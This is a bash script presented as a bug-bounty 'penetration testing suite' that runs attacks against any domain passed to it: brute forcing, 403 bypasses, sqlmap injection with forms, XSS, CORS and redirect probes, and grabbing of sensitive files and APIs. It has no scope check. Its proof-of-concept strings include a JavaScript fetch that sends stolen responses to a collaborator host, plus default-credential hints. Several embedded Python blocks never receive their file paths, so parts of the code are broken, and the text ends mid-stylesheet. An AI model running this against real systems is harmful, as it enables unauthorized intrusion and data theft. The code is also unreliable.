#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════╗
# ║         AUTOPWN PRO — Advanced Penetration Testing Suite        ║
# ║         Professional Bug Bounty & Pentest Automation            ║
# ║         Outputs: Only confirmed vulnerabilities                 ║
# ╚══════════════════════════════════════════════════════════════════╝
# Usage: sudo ./autopwn_pro.sh <target.com> [output_dir]
# Example: sudo ./autopwn_pro.sh target.com ~/pentests

set -euo pipefail

# ── ARGS ────────────────────────────────────────────────────────────
TARGET="${1:-}"
OUTBASE="${2:-$HOME/pentests}"

if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <target.com> [output_dir]"
  exit 1
fi

# ── PATHS ────────────────────────────────────────────────────────────
OUTDIR="$OUTBASE/$TARGET"
RECON="$OUTDIR/01_recon"
ENUM="$OUTDIR/02_enum"
CRAWL="$OUTDIR/03_crawl"
VULN="$OUTDIR/04_vuln"
POC="$OUTDIR/05_poc"
REPORT="$OUTDIR/06_report"
LOGFILE="$OUTDIR/autopwn.log"

mkdir -p "$RECON" "$ENUM" "$CRAWL" "$VULN" "$POC" "$REPORT"

# ── COLORS ──────────────────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
C='\033[0;36m'; M='\033[0;35m'; B='\033[1;34m'; NC='\033[0m'
BOLD='\033[1m'

# ── LOGGING ─────────────────────────────────────────────────────────
log()    { echo -e "${C}[*]${NC} $1" | tee -a "$LOGFILE"; }
found()  { echo -e "${G}[+]${NC} ${BOLD}$1${NC}" | tee -a "$LOGFILE"; }
vuln()   { echo -e "${R}[VULN]${NC} ${BOLD}$1${NC}" | tee -a "$LOGFILE"; }
warn()   { echo -e "${Y}[!]${NC} $1" | tee -a "$LOGFILE"; }
phase()  {
  echo "" | tee -a "$LOGFILE"
  echo -e "${M}╔══════════════════════════════════════════════════╗${NC}" | tee -a "$LOGFILE"
  echo -e "${M}║ $1$(printf '%*s' $((48-${#1})) '')║${NC}" | tee -a "$LOGFILE"
  echo -e "${M}╚══════════════════════════════════════════════════╝${NC}" | tee -a "$LOGFILE"
}

# ── JSON FINDINGS ARRAY (appended throughout) ────────────────────────
FINDINGS_FILE="$OUTDIR/findings.json"
echo '{"target":"'"$TARGET"'","date":"'"$(date -u +%Y-%m-%dT%H:%M:%SZ)"'","findings":[]}' > "$FINDINGS_FILE"

# Helper: append a finding to findings.json
add_finding() {
  local title="$1" severity="$2" cvss="$3" tool="$4" url="$5" param="$6" evidence="$7" poc="$8" remediation="$9"
  local tmp=$(mktemp)
  python3 - <<PYEOF
import json, sys
with open('$FINDINGS_FILE') as f:
    data = json.load(f)
data['findings'].append({
    "title": "$title",
    "severity": "$severity",
    "cvss": "$cvss",
    "tool": "$tool",
    "url": "$url",
    "parameter": "$param",
    "evidence": """$evidence""",
    "poc": """$poc""",
    "remediation": """$remediation"""
})
with open('$FINDINGS_FILE', 'w') as f:
    json.dump(data, f, indent=2)
PYEOF
}

# ── BANNER ──────────────────────────────────────────────────────────
clear
echo -e "${R}"
cat << 'BANNER'
  ___        _        ____                 ____  ____   ___
 / _ \ _   _| |_ ___ |  _ \__      ___ __ |  _ \|  _ \ / _ \
| | | | | | | __/ _ \| |_) \ \ /\ / / '_ \| |_) | |_) | | | |
| |_| | |_| | || (_) |  __/ \ V  V /| | | |  __/|  _ <| |_| |
 \___/ \__,_|\__\___/|_|     \_/\_/ |_| |_|_|   |_| \_\\___/
BANNER
echo -e "${NC}"
echo -e "${C}  Professional Penetration Testing Automation Suite${NC}"
echo -e "${Y}  Target: ${BOLD}$TARGET${NC}"
echo -e "${Y}  Output: ${BOLD}$OUTDIR${NC}"
echo -e "${Y}  Date:   ${BOLD}$(date)${NC}"
echo ""
sleep 1

# ════════════════════════════════════════════════════════════════════
# PHASE 1 — PASSIVE RECONNAISSANCE
# ════════════════════════════════════════════════════════════════════
phase "PHASE 1: PASSIVE RECONNAISSANCE"

log "Subdomain enumeration..."
subfinder -d "$TARGET" -silent -all -o "$RECON/subs_subfinder.txt" 2>/dev/null || true
amass enum -passive -d "$TARGET" -o "$RECON/subs_amass.txt" 2>/dev/null || true
# Merge
cat "$RECON"/subs_*.txt 2>/dev/null | sort -u > "$RECON/all_subs.txt"
SUB_COUNT=$(wc -l < "$RECON/all_subs.txt")
found "Subdomains found: $SUB_COUNT"

log "DNS resolution + CNAME mapping..."
dnsx -l "$RECON/all_subs.txt" -a -cname -resp -silent \
  -o "$RECON/dns_resolved.txt" 2>/dev/null || true

# Check subdomain takeover candidates
log "Checking subdomain takeover..."
TAKEOVER_SERVICES=(
  "s3.amazonaws.com" "github.io" "herokuapp.com" "azurewebsites.net"
  "cloudapp.net" "ghost.io" "netlify.app" "vercel.app" "myshopify.com"
  "zendesk.com" "helpscoutdocs.com" "desk.com" "readme.io"
)
while IFS= read -r line; do
  sub=$(echo "$line" | awk '{print $1}')
  cname=$(echo "$line" | grep -oP 'CNAME\s+\K\S+' || true)
  if [[ -n "$cname" ]]; then
    for svc in "${TAKEOVER_SERVICES[@]}"; do
      if echo "$cname" | grep -qi "$svc"; then
        # Verify the subdomain returns error page
        STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$sub" || echo "000")
        if [[ "$STATUS" == "404" || "$STATUS" == "000" ]]; then
          vuln "SUBDOMAIN TAKEOVER candidate: $sub → $cname (HTTP $STATUS)"
          echo "$sub CNAME $cname HTTP:$STATUS" >> "$POC/subdomain_takeover.txt"
          add_finding \
            "Subdomain Takeover" "HIGH" "8.1" "dnsx+curl" \
            "https://$sub" "subdomain" \
            "CNAME $cname returns HTTP $STATUS - service appears unclaimed" \
            "1. Register account on $svc\n2. Claim $cname\n3. Verify control of $sub" \
            "Remove dangling DNS CNAME record for $sub or re-claim the service"
        fi
      fi
    done
  fi
done < "$RECON/dns_resolved.txt"

log "Historical URL collection..."
gau "$TARGET" --threads 5 2>/dev/null | sort -u > "$RECON/gau_urls.txt" || true
echo "$TARGET" | waybackurls 2>/dev/null | sort -u >> "$RECON/gau_urls.txt" || true
sort -u "$RECON/gau_urls.txt" -o "$RECON/gau_urls.txt"
found "Historical URLs: $(wc -l < "$RECON/gau_urls.txt")"

log "WHOIS & ASN lookup..."
whois "$TARGET" > "$RECON/whois.txt" 2>/dev/null || true
curl -sk "https://ipinfo.io/$(dig +short "$TARGET" | head -1)" \
  > "$RECON/asn_info.json" 2>/dev/null || true

# ════════════════════════════════════════════════════════════════════
# PHASE 2 — ACTIVE ENUMERATION
# ════════════════════════════════════════════════════════════════════
phase "PHASE 2: ACTIVE ENUMERATION"

log "Probing live hosts..."
httpx -l "$RECON/all_subs.txt" \
  -title -tech-detect -status-code -content-length \
  -follow-redirects -silent \
  -o "$ENUM/live_hosts.txt" 2>/dev/null || true

# Extract clean URLs
grep -oP 'https?://[^\s]+' "$ENUM/live_hosts.txt" 2>/dev/null \
  | sort -u > "$ENUM/live_urls.txt" || true
found "Live hosts: $(wc -l < "$ENUM/live_urls.txt")"

log "Nmap service + version scan..."
nmap -sS -T3 -sV -sC --open \
  -p 21,22,23,25,53,80,443,445,3306,3389,5432,6379,8080,8443,8888,9090,9200,27017 \
  -oN "$ENUM/nmap_targeted.txt" \
  -oX "$ENUM/nmap_targeted.xml" \
  "$TARGET" 2>/dev/null || true

# Parse nmap for interesting services
log "Analyzing nmap results for exposed services..."
for port_svc in "21:FTP" "22:SSH" "23:Telnet" "3306:MySQL" "5432:PostgreSQL" \
                "6379:Redis" "9200:Elasticsearch" "27017:MongoDB" "3389:RDP"; do
  port="${port_svc%%:*}"
  svc="${port_svc##*:}"
  if grep -q "$port/tcp.*open" "$ENUM/nmap_targeted.txt" 2>/dev/null; then
    vuln "EXPOSED SERVICE: $svc on port $port"
    VERSION=$(grep "$port/tcp" "$ENUM/nmap_targeted.txt" | head -1 | awk '{print $4,$5,$6}')
    add_finding \
      "Exposed $svc Service" "HIGH" "7.5" "nmap" \
      "$TARGET:$port" "network" \
      "Port $port ($svc) open. Version: $VERSION" \
      "nc -v $TARGET $port\n# Attempt default credentials" \
      "Restrict access via firewall. Require authentication. Use VPN for admin services."
  fi
done

log "WAF detection..."
wafw00f "https://$TARGET" 2>/dev/null | tee "$ENUM/waf.txt" || true

log "Tech stack fingerprinting..."
whatweb "https://$TARGET" --log-verbose="$ENUM/whatweb.txt" 2>/dev/null || true

# Check for outdated software versions
log "Checking for CVEs based on detected versions..."
if grep -qi "WordPress" "$ENUM/whatweb.txt" 2>/dev/null; then
  WP_VER=$(grep -oP 'WordPress[\s/]+\K[\d.]+' "$ENUM/whatweb.txt" | head -1)
  warn "WordPress detected: $WP_VER — running wpscan..."
  wpscan --url "https://$TARGET" --no-update --silent \
    --enumerate vp,u,ap \
    -o "$VULN/wpscan.txt" 2>/dev/null || true
fi

# ════════════════════════════════════════════════════════════════════
# PHASE 3 — DIRECTORY & ENDPOINT DISCOVERY
# ════════════════════════════════════════════════════════════════════
phase "PHASE 3: CRAWL & ENDPOINT DISCOVERY"

WORDLIST_DIR="/usr/share/seclists/Discovery/Web-Content"
ADMIN_WL="$WORDLIST_DIR/AdminPanels.txt"
BIG_WL="$WORDLIST_DIR/raft-large-directories.txt"
PARAMS_WL="$WORDLIST_DIR/burp-parameter-names.txt"

log "Admin panel discovery..."
gobuster dir -u "https://$TARGET" \
  -w "$ADMIN_WL" \
  -o "$CRAWL/admin_panels_raw.txt" \
  -q --no-error --timeout 10s 2>/dev/null || true

# Only save hits
grep -E ' 200 | 302 | 301 | 403 ' "$CRAWL/admin_panels_raw.txt" \
  > "$CRAWL/admin_panels_found.txt" 2>/dev/null || true

ADMIN_COUNT=$(wc -l < "$CRAWL/admin_panels_found.txt" 2>/dev/null || echo 0)
if [[ "$ADMIN_COUNT" -gt 0 ]]; then
  while IFS= read -r line; do
    PATH_HIT=$(echo "$line" | awk '{print $1}')
    CODE=$(echo "$line" | awk '{print $2}')
    vuln "ADMIN PANEL: https://$TARGET$PATH_HIT (HTTP $CODE)"
    add_finding \
      "Exposed Admin Panel" "HIGH" "7.2" "gobuster" \
      "https://$TARGET$PATH_HIT" "path" \
      "Admin path $PATH_HIT accessible with HTTP $CODE" \
      "curl -v https://$TARGET$PATH_HIT\n# Test default creds: admin:admin, admin:password, admin:123456" \
      "Restrict admin paths by IP whitelist. Add MFA. Move to non-standard path."
  done < "$CRAWL/admin_panels_found.txt"
fi

log "Full directory brute force..."
gobuster dir -u "https://$TARGET" \
  -w "$BIG_WL" \
  -o "$CRAWL/dirs_raw.txt" \
  -q --no-error --timeout 10s 2>/dev/null || true

grep -E ' 200 | 301 | 302 ' "$CRAWL/dirs_raw.txt" \
  > "$CRAWL/dirs_found.txt" 2>/dev/null || true

log "403 Bypass testing on restricted paths..."
grep -E ' 403 ' "$CRAWL/dirs_raw.txt" 2>/dev/null | awk '{print $1}' | while read -r RPATH; do
  URL="https://$TARGET$RPATH"
  BYPASSES=(
    "-H 'X-Original-URL: $RPATH'"
    "-H 'X-Forwarded-For: 127.0.0.1'"
    "-H 'X-Custom-IP-Authorization: 127.0.0.1'"
    "--path-as-is ${URL}/."
    "--path-as-is ${URL}%2F"
  )
  for BP in "${BYPASSES[@]}"; do
    CODE=$(eval "curl -sk -o /dev/null -w '%{http_code}' --max-time 5 $BP '$URL'" 2>/dev/null || echo "000")
    if [[ "$CODE" == "200" ]]; then
      vuln "403 BYPASS: $URL via $BP → HTTP 200"
      echo "URL: $URL | Bypass: $BP | Code: 200" >> "$POC/403_bypass.txt"
      add_finding \
        "403 Access Control Bypass" "HIGH" "7.5" "curl" \
        "$URL" "header" \
        "Path $RPATH returns 403 normally but 200 with: $BP" \
        "curl -sk $BP '$URL'" \
        "Fix server-side access control. Do not rely on path-based restrictions. Validate auth at application layer."
    fi
  done
done || true

log "JavaScript file mining..."
getJS --url "https://$TARGET" --output "$CRAWL/js_files.txt" 2>/dev/null || \
  curl -sk "https://$TARGET" | grep -oP 'src="[^"]+\.js[^"]*"' \
  | grep -oP '"[^"]*"' | tr -d '"' > "$CRAWL/js_files.txt" || true

# Extract secrets from JS
log "Scanning JS for hardcoded secrets..."
while IFS= read -r JSURL; do
  [[ -z "$JSURL" ]] && continue
  CONTENT=$(curl -sk --max-time 10 "$JSURL" 2>/dev/null || true)
  # API keys, tokens, passwords
  SECRETS=$(echo "$CONTENT" | grep -oP \
    '(api[_-]?key|apikey|access[_-]?token|secret|password|passwd|auth[_-]?token|bearer)\s*[=:]\s*["\x27][A-Za-z0-9+/=_\-\.]{8,}["\x27]' \
    -i 2>/dev/null || true)
  if [[ -n "$SECRETS" ]]; then
    vuln "HARDCODED SECRET in JS: $JSURL"
    echo "=== $JSURL ===" >> "$POC/js_secrets.txt"
    echo "$SECRETS" >> "$POC/js_secrets.txt"
    add_finding \
      "Hardcoded Secret in JavaScript" "CRITICAL" "9.1" "custom" \
      "$JSURL" "javascript" \
      "Found credentials/tokens in client-side JS: $(echo $SECRETS | head -c 100)" \
      "curl -sk '$JSURL' | grep -iE 'api_key|secret|token|password'" \
      "Never store secrets in client-side code. Use environment variables server-side. Rotate all exposed credentials immediately."
  fi
done < "$CRAWL/js_files.txt"

# Collect all URLs
cat "$RECON/gau_urls.txt" "$CRAWL/dirs_found.txt" 2>/dev/null \
  | grep "^http" | sort -u > "$CRAWL/all_urls.txt"

# Parameter URLs
grep "=" "$CRAWL/all_urls.txt" 2>/dev/null | sort -u > "$CRAWL/param_urls.txt"
found "URLs with parameters: $(wc -l < "$CRAWL/param_urls.txt")"

# ════════════════════════════════════════════════════════════════════
# PHASE 4 — AUTOMATED VULNERABILITY SCANNING
# ════════════════════════════════════════════════════════════════════
phase "PHASE 4: AUTOMATED VULNERABILITY SCANNING"

log "Running Nuclei (confirmed findings only)..."
nuclei -update-templates -silent 2>/dev/null || true

nuclei -l "$ENUM/live_urls.txt" \
  -t "$HOME/nuclei-templates/cves/" \
  -t "$HOME/nuclei-templates/vulnerabilities/" \
  -t "$HOME/nuclei-templates/exposures/" \
  -t "$HOME/nuclei-templates/misconfiguration/" \
  -t "$HOME/nuclei-templates/takeovers/" \
  -t "$HOME/nuclei-templates/default-logins/" \
  -severity critical,high,medium \
  -rate-limit 150 -silent \
  -jsonl \
  -o "$VULN/nuclei_results.jsonl" 2>/dev/null || true

# Parse nuclei output — only confirmed vulns
if [[ -s "$VULN/nuclei_results.jsonl" ]]; then
  python3 << 'PYEOF'
import json, subprocess, os

findings_file = os.environ.get('FINDINGS_FILE', '')
nuclei_file = os.path.expandvars('$VULN/nuclei_results.jsonl')

sev_cvss = {"critical": "9.5", "high": "7.8", "medium": "5.4", "low": "3.1"}

try:
    with open(nuclei_file) as f:
        for line in f:
            try:
                n = json.loads(line.strip())
                sev = n.get('info', {}).get('severity', 'info').lower()
                if sev == 'info':
                    continue
                name = n.get('info', {}).get('name', 'Unknown')
                url = n.get('matched-at', '')
                template = n.get('template-id', '')
                desc = n.get('info', {}).get('description', '')
                remediation = n.get('info', {}).get('remediation', 'Review and patch affected component')
                evidence = n.get('extracted-results', [])
                evidence_str = ', '.join(evidence[:3]) if evidence else f"Template matched: {template}"
                curl_cmd = f"curl -sk '{url}'"
                print(f"[NUCLEI-{sev.upper()}] {name} → {url}")
            except:
                pass
except FileNotFoundError:
    pass
PYEOF
fi

# Parse nuclei into findings
log "Importing nuclei findings..."
python3 << 'PYEOF'
import json, os, subprocess

findings_file = '$FINDINGS_FILE'
nuclei_file = '$VULN/nuclei_results.jsonl'
sev_cvss = {"critical":"9.5","high":"7.8","medium":"5.4","low":"3.1"}

try:
    with open(findings_file) as f:
        data = json.load(f)
    with open(nuclei_file) as f:
        for line in f:
            try:
                n = json.loads(line.strip())
                sev = n.get('info',{}).get('severity','info').lower()
                if sev == 'info':
                    continue
                name = n.get('info',{}).get('name','Unknown')
                url  = n.get('matched-at','')
                tid  = n.get('template-id','')
                desc = n.get('info',{}).get('description','')
                rem  = n.get('info',{}).get('remediation','Review and patch')
                evid = n.get('extracted-results',[])
                evid_str = ', '.join(str(e) for e in evid[:3]) if evid else f"Template {tid} matched"
                data['findings'].append({
                    "title": name,
                    "severity": sev.upper(),
                    "cvss": sev_cvss.get(sev,"5.0"),
                    "tool": "nuclei",
                    "url": url,
                    "parameter": "",
                    "evidence": evid_str,
                    "poc": f"curl -sk '{url}'\nnuclei -u '{url}' -t {tid}",
                    "remediation": rem
                })
            except:
                pass
    with open(findings_file,'w') as f:
        json.dump(data, f, indent=2)
except Exception as e:
    pass
PYEOF

# ════════════════════════════════════════════════════════════════════
# PHASE 5 — TARGETED VULNERABILITY VERIFICATION
# ════════════════════════════════════════════════════════════════════
phase "PHASE 5: TARGETED VULNERABILITY VERIFICATION"

# ── XSS ─────────────────────────────────────────────────────────────
log "XSS testing with dalfox (confirmed only)..."
if [[ -s "$CRAWL/param_urls.txt" ]]; then
  dalfox file "$CRAWL/param_urls.txt" \
    --skip-bav --no-spinner --silence \
    --format json \
    -o "$POC/xss_dalfox.json" 2>/dev/null || true

  # Parse dalfox JSON — only real hits
  python3 << 'PYEOF'
import json, os
findings_file = '$FINDINGS_FILE'
xss_file = '$POC/xss_dalfox.json'
try:
    with open(findings_file) as f:
        data = json.load(f)
    with open(xss_file) as f:
        results = json.load(f)
    for r in results:
        url = r.get('data', {}).get('url', '')
        param = r.get('data', {}).get('param', '')
        payload = r.get('data', {}).get('payload', '')
        ptype = r.get('type', 'Reflected XSS')
        if url and payload:
            poc_url = f"{url}?{param}={payload}" if param else url
            data['findings'].append({
                "title": f"Cross-Site Scripting (XSS) — {ptype}",
                "severity": "HIGH",
                "cvss": "7.4",
                "tool": "dalfox",
                "url": url,
                "parameter": param,
                "evidence": f"Payload executed: {payload[:100]}",
                "poc": f"# Browser PoC\n{poc_url}\n\n# Curl verify\ncurl -sk '{url}' --data '{param}={payload}'",
                "remediation": "Encode all user-supplied output. Implement Content-Security-Policy. Use framework's built-in XSS protections."
            })
    with open(findings_file, 'w') as f:
        json.dump(data, f, indent=2)
except:
    pass
PYEOF
fi

# ── SQL INJECTION ────────────────────────────────────────────────────
log "SQL injection testing with sqlmap..."
if [[ -s "$CRAWL/param_urls.txt" ]]; then
  sqlmap -m "$CRAWL/param_urls.txt" \
    --batch --random-agent --level=2 --risk=2 \
    --no-cast --forms \
    --output-dir="$POC/sqlmap/" \
    --results-file="$POC/sqlmap_results.csv" \
    2>/dev/null || true

  # Check for confirmed injections
  if grep -q "injectable" "$POC/sqlmap_results.csv" 2>/dev/null; then
    while IFS=',' read -r url param dbms; do
      [[ "$param" == "Parameter" ]] && continue
      [[ -z "$param" ]] && continue
      vuln "SQL INJECTION CONFIRMED: $url | Param: $param | DBMS: $dbms"
      add_finding \
        "SQL Injection" "CRITICAL" "9.8" "sqlmap" \
        "$url" "$param" \
        "Parameter '$param' is injectable. DBMS: $dbms" \
        "# Verify manually:\ncurl -sk '$url' --data \"$param=' OR '1'='1\"\n\n# Extract databases:\nsqlmap -u '$url' -p $param --dbs --batch" \
        "Use parameterized queries / prepared statements. Never concatenate user input into SQL. Apply input validation."
    done < "$POC/sqlmap_results.csv"
  fi
fi

# ── OPEN REDIRECT ────────────────────────────────────────────────────
log "Testing open redirects..."
REDIRECT_PAYLOAD="https://oastify.com"
grep -iE "(redirect|return|url|next|goto|dest|target|redir|continue|forward)=" \
  "$CRAWL/param_urls.txt" 2>/dev/null | head -50 | while read -r RURL; do
  PARAM=$(echo "$RURL" | grep -oP '[?&][a-zA-Z_-]+=https?://' | head -1 | grep -oP '[a-zA-Z_-]+' | head -1)
  if [[ -n "$PARAM" ]]; then
    TESTURL=$(echo "$RURL" | sed "s|$PARAM=[^&]*|$PARAM=$REDIRECT_PAYLOAD|g")
    LOCATION=$(curl -sk -o /dev/null -w "%{redirect_url}" --max-time 5 "$TESTURL" 2>/dev/null || true)
    if echo "$LOCATION" | grep -q "oastify.com"; then
      vuln "OPEN REDIRECT: $TESTURL → $LOCATION"
      add_finding \
        "Open Redirect" "MEDIUM" "6.1" "curl" \
        "$RURL" "$PARAM" \
        "Redirected to $REDIRECT_PAYLOAD via $PARAM parameter" \
        "curl -Lv '$TESTURL'\n# Or visit in browser to confirm redirect to attacker domain" \
        "Validate redirect URLs against a whitelist of allowed domains. Never redirect to user-supplied full URLs."
    fi
  fi
done || true

# ── CORS MISCONFIGURATION ────────────────────────────────────────────
log "Testing CORS misconfigurations..."
while IFS= read -r LURL; do
  [[ -z "$LURL" ]] && continue
  RESP=$(curl -sk -H "Origin: https://oastify.com" \
    -o /dev/null -D - --max-time 5 "$LURL" 2>/dev/null | head -20 || true)
  ACAO=$(echo "$RESP" | grep -i "access-control-allow-origin" | awk '{print $2}' | tr -d '\r')
  ACAC=$(echo "$RESP" | grep -i "access-control-allow-credentials" | awk '{print $2}' | tr -d '\r')
  if [[ "$ACAO" == "https://oastify.com" || "$ACAO" == "*" ]] && \
     [[ "$ACAC" =~ true ]]; then
    vuln "CORS MISCONFIGURATION: $LURL (Origin reflected + credentials allowed)"
    add_finding \
      "CORS Misconfiguration" "HIGH" "7.5" "curl" \
      "$LURL" "Origin header" \
      "ACAO: $ACAO | ACAC: $ACAC — arbitrary origin reflected with credentials" \
      "curl -sk -H 'Origin: https://oastify.com' '$LURL' -I\n\n# JS PoC:\nfetch('$LURL', {credentials:'include'})\n  .then(r=>r.text()).then(d=>fetch('https://YOUR-BURP-COLLABORATOR.burpcollaborator.net/?d='+btoa(d)))" \
      "Validate Origin against explicit whitelist. Never reflect arbitrary Origins. Do not combine wildcard with credentials."
    break
  fi
done < "$ENUM/live_urls.txt" || true

# ── SECURITY HEADERS CHECK ───────────────────────────────────────────
log "Checking missing security headers..."
HEADERS_RESP=$(curl -sk -I --max-time 10 "https://$TARGET" 2>/dev/null || true)
declare -A HEADER_CHECKS=(
  ["strict-transport-security"]="Missing HSTS header"
  ["content-security-policy"]="Missing CSP header"
  ["x-frame-options"]="Missing X-Frame-Options (Clickjacking risk)"
  ["x-content-type-options"]="Missing X-Content-Type-Options"
  ["referrer-policy"]="Missing Referrer-Policy"
  ["permissions-policy"]="Missing Permissions-Policy"
)
MISSING_HEADERS=""
for header in "${!HEADER_CHECKS[@]}"; do
  if ! echo "$HEADERS_RESP" | grep -qi "$header"; then
    MISSING_HEADERS="$MISSING_HEADERS\n- ${HEADER_CHECKS[$header]}"
  fi
done
if [[ -n "$MISSING_HEADERS" ]]; then
  add_finding \
    "Missing HTTP Security Headers" "LOW" "4.3" "curl" \
    "https://$TARGET" "response headers" \
    "Missing headers: $MISSING_HEADERS" \
    "curl -sk -I 'https://$TARGET' | grep -iE 'security|csp|hsts|frame|content-type'" \
    "Add all required security headers in web server / CDN configuration."
fi

# ── SENSITIVE FILE EXPOSURE ──────────────────────────────────────────
log "Checking sensitive file exposure..."
SENSITIVE_PATHS=(
  "/.env" "/.git/config" "/.git/HEAD" "/config.php" "/wp-config.php"
  "/web.config" "/.htpasswd" "/backup.zip" "/backup.sql" "/dump.sql"
  "/phpinfo.php" "/info.php" "/test.php" "/server-status" "/server-info"
  "/.DS_Store" "/crossdomain.xml" "/sitemap.xml" "/robots.txt"
  "/api/v1/users" "/api/users" "/swagger.json" "/openapi.json"
  "/.well-known/security.txt" "/graphql" "/graphiql" "/__graphql"
)
for SPATH in "${SENSITIVE_PATHS[@]}"; do
  CODE=$(curl -sk -o /tmp/sensitive_resp -w "%{http_code}" \
    --max-time 5 "https://$TARGET$SPATH" 2>/dev/null || echo "000")
  if [[ "$CODE" == "200" ]]; then
    SIZE=$(wc -c < /tmp/sensitive_resp 2>/dev/null || echo 0)
    if [[ "$SIZE" -gt 10 ]]; then
      vuln "SENSITIVE FILE EXPOSED: https://$TARGET$SPATH (HTTP 200, ${SIZE}B)"
      PREVIEW=$(head -c 200 /tmp/sensitive_resp 2>/dev/null | strings | head -5 || true)
      # Determine severity
      SEV="MEDIUM"; CVSS="5.3"
      if echo "$SPATH" | grep -qE '\.env|wp-config|config\.php|\.git'; then
        SEV="CRITICAL"; CVSS="9.1"
      fi
      add_finding \
        "Sensitive File Exposure: $SPATH" "$SEV" "$CVSS" "curl" \
        "https://$TARGET$SPATH" "path" \
        "File accessible (HTTP 200, ${SIZE} bytes). Preview: $PREVIEW" \
        "curl -sk 'https://$TARGET$SPATH'\n# Check for credentials, keys, or config data" \
        "Remove sensitive files from web root. Add .htaccess deny rules. Use .gitignore to prevent committing secrets."
    fi
  fi
done

# ── API ENDPOINT TESTING ─────────────────────────────────────────────
log "Testing API endpoints for IDOR / broken auth..."
API_ENDPOINTS=$(grep -oP 'https?://[^"'\''\\s]+/api/[^"'\''\\s]+' \
  "$CRAWL/all_urls.txt" 2>/dev/null | sort -u | head -20 || true)
for APIURL in $API_ENDPOINTS; do
  # Test unauthenticated access
  CODE=$(curl -sk -o /tmp/api_resp -w "%{http_code}" --max-time 5 "$APIURL" 2>/dev/null || echo "000")
  if [[ "$CODE" == "200" ]]; then
    CONTENT=$(head -c 500 /tmp/api_resp 2>/dev/null || true)
    # Check if response contains sensitive data patterns
    if echo "$CONTENT" | grep -qiE '"email"|"password"|"token"|"ssn"|"credit_card"|"phone"'; then
      vuln "API DATA EXPOSURE: $APIURL returns sensitive fields unauthenticated"
      add_finding \
        "Unauthenticated API Data Exposure" "HIGH" "8.2" "curl" \
        "$APIURL" "api" \
        "API returns sensitive data without authentication. Sample: $(echo $CONTENT | head -c 200)" \
        "curl -sk '$APIURL'\n# Test with incremental IDs (IDOR):\ncurl -sk '${APIURL%/*}/1'\ncurl -sk '${APIURL%/*}/2'" \
        "Implement authentication on all API endpoints. Apply object-level authorization checks. Never return sensitive fields unnecessarily."
    fi
  fi
done || true

# ════════════════════════════════════════════════════════════════════
# PHASE 6 — REPORT GENERATION
# ════════════════════════════════════════════════════════════════════
phase "PHASE 6: GENERATING PROFESSIONAL REPORT"

TOTAL_FINDINGS=$(python3 -c "
import json
with open('$FINDINGS_FILE') as f:
    d = json.load(f)
print(len(d['findings']))
" 2>/dev/null || echo 0)

found "Total confirmed findings: $TOTAL_FINDINGS"

log "Generating HTML report..."
python3 << 'PYEOF'
import json, os
from datetime import datetime

with open(os.path.expandvars('$FINDINGS_FILE')) as f:
    data = json.load(f)

target = data['target']
findings = data['findings']
date = datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')

sev_order = {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3,'INFO':4}
findings.sort(key=lambda x: sev_order.get(x.get('severity','INFO'),5))

sev_colors = {
    'CRITICAL': '#ff2d55',
    'HIGH': '#ff6b35',
    'MEDIUM': '#ffd60a',
    'LOW': '#30d158',
    'INFO': '#636366'
}
sev_counts = {}
for f in findings:
    s = f.get('severity','INFO')
    sev_counts[s] = sev_counts.get(s, 0) + 1

findings_html = ""
for i, f in enumerate(findings):
    sev = f.get('severity','INFO')
    col = sev_colors.get(sev,'#888')
    poc_html = f.get('poc','').replace('\n','<br>').replace('<','&lt;').replace('>','&gt;')
    poc_html = poc_html.replace('&lt;br&gt;','<br>')
    evid_html = str(f.get('evidence','')).replace('<','&lt;').replace('>','&gt;')
    findings_html += f"""
    <div class="finding" id="f{i}">
      <div class="finding-header" onclick="toggle('f{i}')">
        <div class="finding-left">
          <span class="sev-badge" style="background:{col}20;color:{col};border-color:{col}40">{sev}</span>
          <span class="cvss-badge">CVSS {f.get('cvss','N/A')}</span>
          <span class="finding-title">{f.get('title','Unknown')}</span>
        </div>
        <div class="finding-right">
          <span class="tool-tag">{f.get('tool','')}</span>
          <span class="chevron">▼</span>
        </div>
      </div>
      <div class="finding-body" style="display:none">
        <div class="detail-grid">
          <div class="detail-col">
            <div class="detail-section">
              <div class="detail-label">AFFECTED URL</div>
              <div class="detail-value url-val"><a href="{f.get('url','')}" target="_blank">{f.get('url','')}</a></div>
            </div>
            <div class="detail-section">
              <div class="detail-label">PARAMETER / LOCATION</div>
              <div class="detail-value">{f.get('parameter','N/A')}</div>
            </div>
            <div class="detail-section">
              <div class="detail-label">EVIDENCE</div>
              <div class="detail-value evidence-val">{evid_html}</div>
            </div>
            <div class="detail-section">
              <div class="detail-label">REMEDIATION</div>
              <div class="detail-value remediation-val">{f.get('remediation','')}</div>
            </div>
          </div>
          <div class="detail-col">
            <div class="detail-section poc-section">
              <div class="detail-label">PROOF OF CONCEPT</div>
              <div class="poc-block"><code>{poc_html}</code></div>
            </div>
          </div>
        </div>
      </div>
    </div>"""

summary_bars = ""
for sev, cnt in sorted(sev_counts.items(), key=lambda x: sev_order.get(x[0],5)):
    col = sev_colors.get(sev,'#888')
    pct = int(cnt / max(len(findings),1) * 100)
    summary_bars += f"""
    <div class="summary-row">
      <span class="sev-label" style="color:{col}">{sev}</span>
      <div class="sev-bar-wrap">
        <div class="sev-bar" style="width:{pct}%;background:{col}"></div>
      </div>
      <span class="sev-count">{cnt}</span>
    </div>"""

html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Pentest Report — {target}</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Syne:wght@400;600;800&display=swap');
:root{{
  --bg:#07090d;--surface:#0d1117;--surface2:#161b22;--border:#21262d;
  --text:#e6edf3;--muted:#8b949e;--accent:#58a6ff;
  --crit:#ff2d55;--high:#ff6b35;--med:#ffd60a;--low:#30d158;
}}
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;line-height:1.6}}
a{{color:var(--accent);text-decoration:none}}
.page{{max-width:1200px;margin:0 auto;padding:40px 24px}}
/* HEADER */
.report-header{{
  border-bottom:1px solid var(--border);padding-bottom:40px;margin-bottom:40px;
